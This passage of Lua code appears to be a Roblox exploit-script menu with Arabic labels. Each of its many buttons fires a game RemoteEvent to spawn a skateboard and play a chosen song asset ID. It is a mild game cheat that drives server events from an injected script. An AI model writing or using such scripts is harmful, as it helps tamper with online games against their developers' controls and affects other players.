Tab:AddButton({ 	Name  = "سب 2", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "671399328"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "سب 3", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "6536444735"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "سب 4", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "5849978429"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "سب 5", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا دقيقه للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "7942547789"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

local Section = Tab:AddSection({
	Name = "اغاني اجنبيه"
})

Tab:AddButton({ 	Name  = "DeathBed", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "76463442516219"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "underMy Skin", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "76145067114930"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "Tt - Twice", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "136694442832658"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "Black Pink", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "113887644073284"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "Rare UnLeak", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "79117388043755"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "I Carti", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "95660636199460"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "Fuck Love", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "105663787518318"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "XhDCyeuej", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "127356583789936"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "Rare Unleakkk 2", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "118767914595173"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "Soulless", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "75806444139457"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "Pk Ro paris", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "84543400636750"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "Hypperdrop", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "78527071535561"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "Drain Lieu", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "73154534382655"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "Delicuentir", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "112808748111965"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "Mistal Fiscorder", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "73743664006156"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "Motagem Dimens", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "75038862482887"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "Sab boy", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "85857498059894"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "urue", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "117088145279665"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "LargR Friees", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "84882252466318"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

local Section = Tab:AddSection({
	Name = "اغاني فونك"
})

Tab:AddButton({ 	Name  = "بافو بافو", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "106317184644394"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "فونك نادر", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "98677515506006"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "فونك", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "88505573152008"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "افخم فونك", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

    	local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "17647322226"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "فونك غضب", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

    	local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "115859025716354"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "فونك 5×30", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

    	local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "73966367524216"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "فونك عالمي", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

    	local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "76578817848504"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "فونك تيك توك", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

    	local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "93218265275853"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "فونك ممتاز", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

    	local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "102402883551679"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "فونك روسي", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

    	local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "103066073385622"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "فونك برازيلي", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

    	local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "75038862482887"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "فونك هندي", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

    	local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "91301048841024"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "فونك جهنمي", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

    	local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "96527800313172"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "فونك اسطوري", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

    	local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "115028690484951"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "فونك التربية السيئة", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

    	local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "91161894069716"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "فينوم فونك", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "8086734311"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "فونك نادر", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "4806290024"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "فونك برازيلي 1", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "15689446096"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "فونك برازيلي 2", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "111281710445018"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "فونك دبكه", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "87968531262747"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "فونك ايضا", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "17422156627"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "فونك دبكه عربي", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "87968531262747"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "فونك ذس اس ثانكس", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "9058205566"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "برازيلي", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "111281710445018"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "فونك ناررر", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "73966367524216"
}
 
